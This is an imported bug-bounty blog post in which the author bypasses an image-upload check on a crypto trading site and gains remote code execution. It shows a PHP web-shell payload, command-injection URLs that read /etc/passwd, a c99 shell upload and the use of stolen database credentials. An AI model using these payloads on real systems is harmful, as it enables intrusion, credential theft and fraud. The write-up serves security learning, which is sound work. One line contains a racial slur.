---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-02-17_uploading-backdoor-for-fun-and-profit_2.md
original_filename: 2020-02-17_uploading-backdoor-for-fun-and-profit_2.md
title: Uploading Backdoor For Fun And Profit.
category: documents
detected_topics:
- command-injection
- access-control
- file-upload
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- access-control
- file-upload
- automation-abuse
- api-security
language: en
raw_sha256: 2f300f0b07ba5b2272fcc6448642f5fc9f4d471d5cbc92d2d81557575857af1b
text_sha256: bd093761437e028bb13eed9d1908049e9be1341124e5f6b680bdb3f9fe11ab93
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Uploading Backdoor For Fun And Profit.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-02-17_uploading-backdoor-for-fun-and-profit_2.md
- Source Type: markdown
- Detected Topics: command-injection, access-control, file-upload, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `2f300f0b07ba5b2272fcc6448642f5fc9f4d471d5cbc92d2d81557575857af1b`
- Text SHA256: `bd093761437e028bb13eed9d1908049e9be1341124e5f6b680bdb3f9fe11ab93`


## Content

---
title: "Uploading Backdoor For Fun And Profit."
url: "https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125"
authors: ["Mohammed Abdul Raheem (@mohdaltaf163)"]
bugs: ["Unrestricted file upload", "RCE"]
publication_date: "2020-02-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4770
scraped_via: "browseros"
---

# Uploading Backdoor For Fun And Profit.

Uploading Backdoor For Fun And Profit.
Mohammed Abdul Raheem
Follow
4 min read
·
Feb 17, 2020

150

1

Hi folks,

After a long time decided to share something to gain knowledge.

The website was a crypto trading platform and i was looking for P1. For those who always worry to find P1's, here are few things you should look at.

Chaining of bugs + Impact to whole application/server + Difficult to Exploit? Make it easily exploitable ;)

Here is the one to learn single click exploits https://vulnerabilities.in/blog/

Logging into the application have functionality “File Upload” If i want to find RCE the first thing comes to my mind is to play with file upload functionality. There are many other ways to find RCE.

This will be helpful https://medium.com/@ozguralp/simple-remote-code-execution-vulnerability-examples-for-beginners-985867878311

Let’s direct to the POC — Application allows users to upload only image files, i tried uploading html, php files but i was restricted to upload such files.

Press enter or click to view image in full size

Then what? Lets Bypass..

I tried changing file type .php to phps, phpt, php3, php4, php5, php.jpg etc.. and also tried Googling for “file upload bypasses hackerone” and learned very good reports, then a thought comes to my mind “how images are getting validated?”

I saw content-disposition and content-type headers while uploading files.

I tried playing with these headers, removed both content-disposition and content-type headers to check if these are checking at server side.

Yes! it was checking at server side and i was not able to upload images without content headers.

To be professional we should learn how things are working. “first learn it then break it” with this thought i started learning things from OWASP file upload bypasses https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload and the bypass was available in OWASP sheet.

Tried uploading png > Captured request with burp > Changed Content-Type: image/png to Content-Type: text/html

Press enter or click to view image in full size
Bypassed!

The content-type header was checking at server side but there was no header validation so i was able to bypass file upload functionality.

Checking — if http request comes with these headers.

validation — what value should come with these headers.

File Upload? Bypassed..!! RCE? Let’s see…

Uploaded php file with code inside <?php phpinfo(); ?> (php file upload > right click > view image > phpinfo page) — Remote Code Execution!

Get Mohammed Abdul Raheem’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now Uploaded php file with code inside <?php echo system($_GET["cmd"]); ?> (php file upload > right click > view image > https://TargetSite.com/logo/216.php > added ?cmd=whoami; id; uname -a > https://TargetSite.com/logo/216.php?cmd=whoami; id; uname -a)

Press enter or click to view image in full size
Code Execution

when i tried to look /etc/passwd file, i was getting a blank page in response. (https://TargerSite.com/logo/216.php?cmd=cat /etc/passwd > blank page). Don’t know why i was not able to read /etc/passwd file.

Thought there might be restrictions.

Thanks to this nigga 
Muhammad Khizer Javed
 for this blog https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/

While reading his blog i saw ‘+’ after “cat command” and then able to see /etc/passwd file.

https://TargetSite.com/logo/216.php?cmd=cat+/etc/passwd > Bingo!

Press enter or click to view image in full size
/etc/passwd

Done? No! Explore more…

Looking at the file shows ‘MySQLServer’ is running behind, thought to try something fishy!

Uploaded c99 shell and found many sensitive files. Here is the one…

db-credentials

Now logged in to database with credentials > found my account in users table > Able to add BTC’s to my account.

Added BTC? No! Reported? Yes! Rewarded? Yes! :) But..

I heard saying people “RCE is not a direct vulnerability, it is the end result of a vulnerability”

Press enter or click to view image in full size

But to be clear, Remote code Execution is not the end, if you finds RCE in bug bounty program then first think what you can do with it.

Example : As this was a crypto trading platform, found db-credential > logged in to database > found myself in users table > able to add a lot of BTC’s to my account. P1 ¯\_(ツ)_/¯

Also after “Remote Code Execution” we can go for “Privilege Escalation” which will be helpful for further exploitation. but..

Note : Before proceeding for further exploitation first read the programs policy, if you are allowed to do further exploitation then go for it or else submit a request and take approval and then ./exploit 😎

Here are 2 good blogs for learning privilege escalation techniques. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

A guide to Linux Privilege Escalation
What is Privilege escalation? Most computer systems are designed for use with multiple users. Privileges mean what a…

payatu.com

In my next upcoming blog i will try to write about “Rooting Server and gaining more privileges after RCE”.
